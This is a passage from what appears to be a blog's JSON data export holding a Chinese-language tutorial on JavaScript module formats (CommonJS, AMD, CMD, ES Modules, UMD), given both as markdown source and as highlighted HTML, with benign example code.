模块的实现，或者一个JavaScript对象。如果为函数，它应该只被执行一次，如果是对象，此对象应该为模块的输出值。\n\n使用`RequireJS`的require函数加载模块:\n\n``require([dependencies], callback);``\n\n- `dependencies`: 表示所依赖的模块\n- `callback`: 一个回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块\n\nbase.js\n\n```js\ndefine(function() {\n    return {\n        mix: function(source, target) {\n        }\n    };\n});\n```\n\nui.js\n\n```js\ndefine(['base'], function(base) {\n    return {\n        show: function() {\n            // todo with module base\n        }\n    }\n});\n```\n\npage.js\n\n```js\ndefine(['data', 'ui'], function(data, ui) {\n    // init here\n})\n```\n\ndata.js\n\n```js\ndefine({\n    users: [],\n    members: []\n});\n```\n\n以上同时演示了define的三种用法\n1. 定义无依赖的模块（base.js）\n2. 定义有依赖的模块（ui.js，page.js）\n3. 定义数据对象模块（data.js）\n\n### CMD\n\nAMD开始为摆脱CommonJS的束缚，开创性的提出了自己的模块风格。但后来又做了妥协，兼容了 CommonJS Modules/Wrappings 。所以就有了`CMD`, 它的语法如下:\n\n``define(id?, dependencies?, factory);``\n\n因为CMD推崇一个文件一个模块，所以经常就用文件名作为模块id；\n\nCMD推崇依赖就近，所以一般不在define的参数中写依赖，而是在factory中写。\n\nfactory有三个参数：\n\n```\nfunction(require, exports, module){}\n```\n\n- `require`: require 是一个方法，接受 模块标识 作为唯一参数，用来获取其他模块提供的接口；\n\n- `exports`: exports 是一个对象，用来向外提供模块接口；\n\n- `module`: module 是一个对象，上面存储了与当前模块相关联的一些属性和方法。\n\ndemo: \n\n```js\ndefine(function(require, exports, module) {\n    var base = require('base');\n    exports.show = function() {\n        // todo with module base\n    }\n});\n```\n\n> AMD推崇依赖前置，在定义模块的时候就要声明其依赖的模块. CMD推崇就近依赖，只有在用到某个模块的时候再去require.\n\nAMD和CMD最大的区别是对依赖模块的执行时机处理不同，注意不是加载的时机或者方式不同\n很多人说requireJS是异步加载模块，SeaJS是同步加载模块，这么理解实际上是不准确的，其实加载模块都是异步的，只不过AMD依赖前置，js可以方便知道依赖模块是谁，立即加载，而CMD就近依赖，需要使用把模块变为字符串解析一遍才知道依赖了那些模块，这也是很多人诟病CMD的一点，牺牲性能来带来开发的便利性，实际上解析模块用的时间短到可以忽略。\n\n## ES Module\n\n在 ES2015 标准为出来之前，最主要的是CommonJS和AMD规范。上文中我们已经介绍了 CommonJS 规范（主要是为了服务端 NodeJS 服务）和 AMD（主要引用在浏览器端），那么当 ES6标准的出现，为浏览器端模块化做了一个非常好的补充。\n\n`export`用于对外输出本模块（一个文件可以理解为一个模块）变量的接口\n`import`用于导入`export`导出的模块\n\n```js\n// index.js\nexport const fn1 = function () {\n  console.log('fn1')\n}\n\nexport const fn2 = function () {\n  console.log('fn2')\n}\n\nconst fn = {\n  fn1,\n  fn2\n}\n\nexport default fn\n\n// index1.js\nimport { fn1, fn2 } from 'index.js'\nfn1() // 'fn1'\nfn2() // 'fn2' \n\nimport fn from 'index.js'\nconsole.log(fn) // {fn1: ƒ, fn2: ƒ}\n```\n\nexport 可以导出的是一个对象中包含的多个 属性，方法。 export default 只能导出 一个 可以不具名的 对象。\n\n`import {fn} from './xxx/xxx'` ( export 导出方式的 引用方式 ) `import fn from './xxx/xxx1'` ( export default 导出方式的 引用方式 )\n\n## UMD\n\nAMD以浏览器为第一（browser-first）的原则发展，选择异步加载模块。它的模块支持对象（objects）、函数（functions）、构造器（constructors）、字符串（strings）、JSON等各种类型的模块。因此在浏览器中它非常灵活。\n\n \n\nCommonJS module以服务器端为第一（server-first）的原则发展，选择同步加载模块。它的模块是无需包装的（unwrapped modules）且贴近于ES.next/Harmony的模块格式。但它仅支持对象类型（objects）模块。\n\n \n\n这迫使一些人又想出另一个更通用格式 UMD(Universal Module Definition)。希望提供一个前后端跨平台的解决方案。\n\n \n\nUMD的实现很简单，先判断是否支持Node.js模块格式（exports是否存在），存在则使用Node.js模块格式。\n\n再判断是否支持AMD（define是否存在），存在则使用AMD方式加载模块。前两个都不存在，则将模块公开到全局（window或global）。\n\n下面是一个示例\n\n```js\n(function (root, factory) {\n  if(typeof exports === 'object' && typeof module === 'object')\n    module.exports = factory();\n  else if(typeof define === 'function' && define.amd)\n    define([], factory);\n  else if(typeof exports === 'object')\n    exports[\"nav\"] = factory();\n  else\n    root[\"nav\"] = factory();\n})(window, this, function() {\n  // module\n  return {\n    addEvent: function(el, type, handle) {\n      //...\n    },\n    removeEvent: function(el, type, handle) {\n             \n    },\n  };\n})\n```\n\n\n\n\n\n","source":"_posts/Javascript 模块管理.md","raw":"---\ntitle: Javascript 模块管理\ndate: 2020-08-29 20:22:43\ntags:\n---\n\n## CommonJS\n\n`CommonJS`是`Node.js`对模块开发的标准规范。\n\nCommonJS module基本要求如下：\n<!-- more -->\n- 一个文件就是一个模块，拥有单独的作用域\n- 普通方式定义的 变量、函数、对象都属于该模块内\n- 通过 `require` 来加载模块\n- 通过 `exports` 和 `module.exports` 来暴露模块中的内容\n\n\ndemo1: \n\n```js\n// module.js\nmodule.exports = {\n  name: \"zhang\",\n  getName: function() {\n    console.log(this.name);\n  },\n  changeName: function(n) {\n    this.name = n;\n  }\n};\n\n// index.js\nconst module = require(\"./module/index\");\nconsole.log(module)\t//  {name: \"zhang\", getName: ƒ, changeName: ƒ} \"commons\"\n```\n\ndemo2:\n\n```js\n// module1.js\nconst getParam = () => {\n  console.log(a);\n};\nlet a = 123;\nlet b = 456;\n\nexports.a = a;\nexports.b = b;\nexports.getParam = getParam;\n\n// index.js\nconst module1 = require(\"./module/index1\");\nconsoel.log(module1, \"commons1\")\t// {a: 123, b: 456, getParam: ƒ} \"commons1\"\n``` \n\ndemo3: \n\n```js\n// module2.js\nlet a = 123;\n\nconst getSome = () => {\n  console.log(\"yyy\");\n};\n\nconst getA = () => {\n  console.log(a);\n};\n\nexports.getSome = getSome;\nmodule.exports = getA;\n\n// index.js\nconst module2 = require(\"./module/index2\");\nconsoel.log(module2, \"commons2\")\t// function getA() {...}\n```\n\n> 总结 ： 通过这样的一个对比的例子就可以比较清晰的对比出  exports 和  module.exports  的区别:\n1、当 exports 和 module.exports 同时存在的时候，module.exports 会盖过 exports\n2、当模块内部全部是 exports 的时候， 就等同于 module.exports\n3、最后 我们就可以认定为  exports  其实就是 module.exports 的子集。\n\n## AMD\n\nAMD全称为异步模块定义, 是专门为浏览器中JavaScript环境设计的规范。\n\nAMD设计出一个简洁的写模块API：\n\n``define(id?, dependencies?, factory);``\n\n其中：\n\n- `id`: 模块标识，可以省略。\n- `dependencies`: 所依赖的模块，可以省略。\n- `factory`: 模块的实现，或者一个JavaScript对象。如果为函数，它应该只被执行一次，如果是对象，此对象应该为模块的输出值。\n\n使用`RequireJS`的require函数加载模块:\n\n``require([dependencies], callback);``\n\n- `dependencies`: 表示所依赖的模块\n- `callback`: 一个回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块\n\nbase.js\n\n```js\ndefine(function() {\n    return {\n        mix: function(source, target) {\n        }\n    };\n});\n```\n\nui.js\n\n```js\ndefine(['base'], function(base) {\n    return {\n        show: function() {\n            // todo with module base\n        }\n    }\n});\n```\n\npage.js\n\n```js\ndefine(['data', 'ui'], function(data, ui) {\n    // init here\n})\n```\n\ndata.js\n\n```js\ndefine({\n    users: [],\n    members: []\n});\n```\n\n以上同时演示了define的三种用法\n1. 定义无依赖的模块（base.js）\n2. 定义有依赖的模块（ui.js，page.js）\n3. 定义数据对象模块（data.js）\n\n### CMD\n\nAMD开始为摆脱CommonJS的束缚，开创性的提出了自己的模块风格。但后来又做了妥协，兼容了 CommonJS Modules/Wrappings 。所以就有了`CMD`, 它的语法如下:\n\n``define(id?, dependencies?, factory);``\n\n因为CMD推崇一个文件一个模块，所以经常就用文件名作为模块id；\n\nCMD推崇依赖就近，所以一般不在define的参数中写依赖，而是在factory中写。\n\nfactory有三个参数：\n\n```\nfunction(require, exports, module){}\n```\n\n- `require`: require 是一个方法，接受 模块标识 作为唯一参数，用来获取其他模块提供的接口；\n\n- `exports`: exports 是一个对象，用来向外提供模块接口；\n\n- `module`: module 是一个对象，上面存储了与当前模块相关联的一些属性和方法。\n\ndemo: \n\n```js\ndefine(function(require, exports, module) {\n    var base = require('base');\n    exports.show = function() {\n        // todo with module base\n    }\n});\n```\n\n> AMD推崇依赖前置，在定义模块的时候就要声明其依赖的模块. CMD推崇就近依赖，只有在用到某个模块的时候再去require.\n\nAMD和CMD最大的区别是对依赖模块的执行时机处理不同，注意不是加载的时机或者方式不同\n很多人说requireJS是异步加载模块，SeaJS是同步加载模块，这么理解实际上是不准确的，其实加载模块都是异步的，只不过AMD依赖前置，js可以方便知道依赖模块是谁，立即加载，而CMD就近依赖，需要使用把模块变为字符串解析一遍才知道依赖了那些模块，这也是很多人诟病CMD的一点，牺牲性能来带来开发的便利性，实际上解析模块用的时间短到可以忽略。\n\n## ES Module\n\n在 ES2015 标准为出来之前，最主要的是CommonJS和AMD规范。上文中我们已经介绍了 CommonJS 规范（主要是为了服务端 NodeJS 服务）和 AMD（主要引用在浏览器端），那么当 ES6标准的出现，为浏览器端模块化做了一个非常好的补充。\n\n`export`用于对外输出本模块（一个文件可以理解为一个模块）变量的接口\n`import`用于导入`export`导出的模块\n\n```js\n// index.js\nexport const fn1 = function () {\n  console.log('fn1')\n}\n\nexport const fn2 = function () {\n  console.log('fn2')\n}\n\nconst fn = {\n  fn1,\n  fn2\n}\n\nexport default fn\n\n// index1.js\nimport { fn1, fn2 } from 'index.js'\nfn1() // 'fn1'\nfn2() // 'fn2' \n\nimport fn from 'index.js'\nconsole.log(fn) // {fn1: ƒ, fn2: ƒ}\n```\n\nexport 可以导出的是一个对象中包含的多个 属性，方法。 export default 只能导出 一个 可以不具名的 对象。\n\n`import {fn} from './xxx/xxx'` ( export 导出方式的 引用方式 ) `import fn from './xxx/xxx1'` ( export default 导出方式的 引用方式 )\n\n## UMD\n\nAMD以浏览器为第一（browser-first）的原则发展，选择异步加载模块。它的模块支持对象（objects）、函数（functions）、构造器（constructors）、字符串（strings）、JSON等各种类型的模块。因此在浏览器中它非常灵活。\n\n \n\nCommonJS module以服务器端为第一（server-first）的原则发展，选择同步加载模块。它的模块是无需包装的（unwrapped modules）且贴近于ES.next/Harmony的模块格式。但它仅支持对象类型（objects）模块。\n\n \n\n这迫使一些人又想出另一个更通用格式 UMD(Universal Module Definition)。希望提供一个前后端跨平台的解决方案。\n\n \n\nUMD的实现很简单，先判断是否支持Node.js模块格式（exports是否存在），存在则使用Node.js模块格式。\n\n再判断是否支持AMD（define是否存在），存在则使用AMD方式加载模块。前两个都不存在，则将模块公开到全局（window或global）。\n\n下面是一个示例\n\n```js\n(function (root, factory) {\n  if(typeof exports === 'object' && typeof module === 'object')\n    module.exports = factory();\n  else if(typeof define === 'function' && define.amd)\n    define([], factory);\n  else if(typeof exports === 'object')\n    exports[\"nav\"] = factory();\n  else\n    root[\"nav\"] = factory();\n})(window, this, function() {\n  // module\n  return {\n    addEvent: function(el, type, handle) {\n      //...\n    },\n    removeEvent: function(el, type, handle) {\n             \n    },\n  };\n})\n```\n\n\n\n\n\n","slug":"Javascript 模块管理","published":1,"updated":"2022-03-06T08:42:24.516Z","_id":"cl0eyp64q0000hommbwi0a6tv","comments":1,"layout":"post","photos":[],"link":"","content":"<html><head></head><body><h2 id=\"CommonJS\"><a href=\"#CommonJS\" class=\"headerlink\" title=\"CommonJS\"></a>CommonJS</h2><p><code>CommonJS</code>是<code>Node.js</code>对模块开发的标准规范。</p>\n<p>CommonJS module基本要求如下：</p>\n<span id=\"more\"></span>\n<ul>\n<li>一个文件就是一个模块，拥有单独的作用域</li>\n<li>普通方式定义的 变量、函数、对象都属于该模块内</li>\n<li>通过 <code>require</code> 来加载模块</li>\n<li>通过 <code>exports</code> 和 <code>module.exports</code> 来暴露模块中的内容</li>\n</ul>\n<p>demo1: </p>\n<figure class=\"highlight js hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-comment\">// module.js</span></span><br><span class=\"line\"><span class=\"variable language_\">module</span>.<span class=\"hljs-property\">exports</span> = {</span><br><span class=\"line\">  <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">\"zhang\"</span>,</span><br><span class=\"line\">  <span class=\"hljs-attr\">getName</span>: <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span>.<span class=\"hljs-property\">name</span>);</span><br><span class=\"line\">  },</span><br><span class=\"line\">  <span class=\"hljs-attr\">changeName</span>: <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">n</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"hljs-property\">name</span> = n;</span><br><span class=\"line\">  }</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-comment\">// index.js</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> <span class=\"variable language_\">module</span> = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">\"./module/index\"</span>);</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">module</span>)\t<span class=\"hljs-comment\">//  {name: \"zhang\", getName: ƒ, changeName: ƒ} \"commons\"</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>demo2:</p>\n<figure class=\"highlight js hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-comment\">// module1.js</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> <span class=\"title function_\">getParam</span> = (<span class=\"hljs-params\"></span>) =&gt; {</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(a);</span><br><span class=\"line\">};</span><br><span class=\"line\"><span class=\"hljs-keyword\">let</span> a = <span class=\"hljs-number\">123</span>;</span><br><span class=\"line\"><span class=\"hljs-keyword\">let</span> b = <span class=\"hljs-number\">456</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-built_in\">exports</span>.<span class=\"hljs-property\">a</span> = a;</span><br><span class=\"line\"><span class=\"hljs-built_in\">exports</span>.<span class=\"hljs-property\">b</span> = b;</span><br><span class=\"line\"><span class=\"hljs-built_in\">exports</span>.<span class=\"hljs-property\">getParam</span> = getParam;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-comment\">// index.js</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> module1 = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">\"./module/index1\"</span>);</span><br><span class=\"line\">consoel.<span class=\"title function_\">log</span>(module1, <span class=\"hljs-string\">\"commons1\"</span>)\t<span class=\"hljs-comment\">// {a: 123, b: 456, getParam: ƒ} \"commons1\"</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>demo3: </p>\n<figure class=\"highlight js hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-comment\">// module2.js</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">let</span> a = <span class=\"hljs-number\">123</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> <span class=\"title function_\">getSome</span> = (<span class=\"hljs-params\"></span>) =&gt; {</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"hljs-string\">\"yyy\"</span>);</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> <span class=\"title function_\">getA</span> = (<span class=\"hljs-params\"></span>) =&gt; {</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(a);</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-built_in\">exports</span>.<span class=\"hljs-property\">getSome</span> = getSome;</span><br><span class=\"line\"><span class=\"variable language_\">module</span>.<span class=\"hljs-property\">exports</span> = getA;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-comment\">// index.js</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> module2 = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">\"./module/index2\"</span>);</span><br><span class=\"line\">consoel.<span class=\"title function_\">log</span>(module2, <span class=\"hljs-string\">\"commons2\"</span>)\t<span class=\"hljs-comment\">// function getA() {...}</span></span><br></pre></td></tr></tbody></table></figure>\n\n<blockquote>\n<p>总结 ： 通过这样的一个对比的例子就可以比较清晰的对比出  exports 和  module.exports  的区别:<br>1、当 exports 和 module.exports 同时存在的时候，module.exports 会盖过 exports<br>2、当模块内部全部是 exports 的时候， 就等同于 module.exports<br>3、最后 我们就可以认定为  exports  其实就是 module.exports 的子集。</p>\n</blockquote>\n<h2 id=\"AMD\"><a href=\"#AMD\" class=\"headerlink\" title=\"AMD\"></a>AMD</h2><p>AMD全称为异步模块定义, 是专门为浏览器中JavaScript环境设计的规范。</p>\n<p>AMD设计出一个简洁的写模块API：</p>\n<p><code>define(id?, dependencies?, factory);</code></p>\n<p>其中：</p>\n<ul>\n<li><code>id</code>: 模块标识，可以省略。</li>\n<li><code>dependencies</code>: 所依赖的模块，可以省略。</li>\n<li><code>factory</code>: 模块的实现，或者一个JavaScript对象。如果为函数，它应该只被执行一次，如果是对象，此对象应该为模块的输出值。</li>\n</ul>\n<p>使用<code>RequireJS</code>的require函数加载模块:</p>\n<p><code>require([dependencies], callback);</code></p>\n<ul>\n<li><code>dependencies</code>: 表示所依赖的模块</li>\n<li><code>callback</code>: 一个回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块</li>\n</ul>\n<p>base.js</p>\n<figure class=\"highlight js hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">define</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) {</span><br><span class=\"line\">    <span class=\"hljs-keyword\">return</span> {</span><br><span class=\"line\">        <span class=\"hljs-attr\">mix</span>: <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">source, target</span>) {</span><br><span class=\"line\">        }</span><br><span class=\"line\">    };</span><br><span class=\"line\">});</span><br></pre></td></tr></tbody></table></figure>\n\n<p>ui.js</p>\n<figure class=\"highlight js hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">define</span>([<span class=\"hljs-string\">'base'</span>], <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">base</span>) {</span><br><span class=\"line\">    <span class=\"hljs-keyword\">return</span> {</span><br><span class=\"line\">        <span class=\"hljs-attr\">show</span>: <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) {</span><br><span class=\"line\">            <span class=\"hljs-comment\">// todo with module base</span></span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">});</span><br></pre></td></tr></tbody></table></figure>\n\n<p>page.js</p>\n<figure class=\"highlight js hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">define</span>([<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-string\">'ui'</span>], <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">data, ui</span>) {</span><br><span class=\"line\">    <span class=\"hljs-comment\">// init here</span></span><br><span class=\"line\">})</span><br></pre></td></tr></tbody></table></figure>\n\n<p>data.js</p>\n<figure class=\"highlight js hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">define</span>({</span><br><span class=\"line\">    <span class=\"hljs-attr\">users</span>: [],</span><br><span class=\"line\">    <span class=\"hljs-attr\">members</span>: []</span><br><span class=\"line\">});</span><br></pre></td></tr></tbody></table></figure>\n\n<p>以上同时演示了define的三种用法</p>\n<ol>\n<li>定义无依赖的模块（base.js）</li>\n<li>定义有依赖的模块（ui.js，page.js）</li>\n<li>定义数据对象模块（data.js）</li>\n</ol>\n<h3 id=\"CMD\"><a href=\"#CMD\" class=\"headerlink\" title=\"CMD\"></a>CMD</h3><p>AMD开始为摆脱CommonJS的束缚，开创性的提出了自己的模块风格。但后来又做了妥协，兼容了 CommonJS Modules/Wrappings 。所以就有了<code>CMD</code>, 它的语法如下:</p>\n<p><code>define(id?, dependencies?, factory);</code></p>\n<p>因为CMD推崇一个文件一个模块，所以经常就用文件名作为模块id；</p>\n<p>CMD推崇依赖就近，所以一般不在define的参数中写依赖，而是在factory中写。</p>\n<p>factory有三个参数：</p>\n<figure class=\"highlight plaintext hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function(require, exports, module){}</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li><p><code>require</code>: require 是一个方法，接受 模块标识 作为唯一参数，用来获取其他模块提供的接口；</p>\n</li>\n<li><p><code>exports</code>: exports 是一个对象，用来向外提供模块接口；</p>\n</li>\n<li><p><code>module</code>: module 是一个对象，上面存储了与当前模块相关联的一些属性和方法。</p>\n</li>\n</ul>\n<p>demo: </p>\n<figure class=\"highlight js hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">define</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">require</span>, <span class=\"hljs-built_in\">exports</span>, <span class=\"variable language_\">module</span></span>) {</span><br><span class=\"line\">    <span class=\"hljs-keyword\">var</span> base = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'base'</span>);</span><br><span class=\"line\">    <span class=\"hljs-built_in\">exports</span>.<span class=\"hljs-property\">show</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) {</span><br><span class=\"line\">        <span class=\"hljs-comment\">// todo with module base</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">});</span><br></pre></td></tr></tbody></table></figure>\n\n<blockquote>\n<p>AMD推崇依赖前置，在定义模块的时候就要声明其依赖的模块. CMD推崇就近依赖，只有在用到某个模块的时候再去require.</p>\n</blockquote>\n<p>AMD和CMD最大的区别是对依赖模块的执行时机处理不同，注意不是加载的时机或者方式不同<br>很多人说requireJS是异步加载模块，SeaJS是同步加载模块，这么理解实际上是不准确的，其实加载模块都是异步的，只不过AMD依赖前置，js可以方便知道依赖模块是谁，立即加载，而CMD就近依赖，需要使用把模块变为字符串解析一遍才知道依赖了那些模块，这也是很多人诟病CMD的一点，牺牲性能来带来开发的便利性，实际上解析模块用的时间短到可以忽略。</p>\n<h2 id=\"ES-Module\"><a href=\"#ES-Module\" class=\"headerlink\" title=\"ES Module\"></a>ES Module</h2><p>在 ES2015 标准为出来之前，最主要的是CommonJS和AMD规范。上文中我们已经介绍了 CommonJS 规范（主要是为了服务端 NodeJS 服务）和 AMD（主要引用在浏览器端），那么当 ES6标准的出现，为浏览器端模块化做了一个非常好的补充。</p>\n<p><code>export</code>用于对外输出本模块（一个文件可以理解为一个模块）变量的接口<br><code>import</code>用于导入<code>export</code>导出的模块</p>\n<figure class=\"highlight js hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-comment\">// index.js</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">const</span> fn1 = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) {</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"hljs-string\">'fn1'</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">const</span> fn2 = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) {</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"hljs-string\">'fn2'</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> fn = {</span><br><span class=\"line\">  fn1,</span><br><span class=\"line\">  fn2</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> fn</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-comment\">// index1.js</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">import</span> { fn1, fn2 } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'index.js'</span></span><br><span class=\"line\"><span class=\"title function_\">fn1</span>() <span class=\"hljs-comment\">// 'fn1'</span></span><br><span class=\"line\"><span class=\"title function_\">fn2</span>() <span class=\"hljs-comment\">// 'fn2' </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-keyword\">import</span> fn <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'index.js'</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(fn) <span class=\"hljs-comment\">// {fn1: ƒ, fn2: ƒ}</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>export 可以导出的是一个对象中包含的多个 属性，方法。 export default 只能导出 一个 可以不具名的 对象。</p>\n<p><code>import {fn} from './xxx/xxx'</code> ( export 导出方式的 引用方式 ) <code>import fn from './xxx/xxx1'</code> ( export default 导出方式的 引用方式 )</p>\n<h2 id=\"UMD\"><a href=\"#UMD\" class=\"headerlink\" title=\"UMD\"></a>UMD</h2><p>AMD以浏览器为第一（browser-first）的原则发展，选择异步加载模块。它的模块支持对象（objects）、函数（functions）、构造器（constructors）、字符串（strings）、JSON等各种类型的模块。因此在浏览器中它非常灵活。</p>\n<p>CommonJS module以服务器端为第一（server-first）的原则发展，选择同步加载模块。它的模块是无需包装的（unwrapped modules）且贴近于ES.next/Harmony的模块格式。但它仅支持对象类型（objects）模块。</p>\n<p>这迫使一些人又想出另一个更通用格式 UMD(Universal Module Definition)。希望提供一个前后端跨平台的解决方案。</p>\n<p>UMD的实现很简单，先判断是否支持Node.js模块格式（exports是否存在），存在则使用Node.js模块格式。</p>\n<p>再判断是否支持AMD（define是否存在），存在则使用AMD方式加载模块。前两个都不存在，则将模块公开到全局（window或global）。</p>\n<p>下面是一个示例</p>\n<figure class=\"highlight js hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 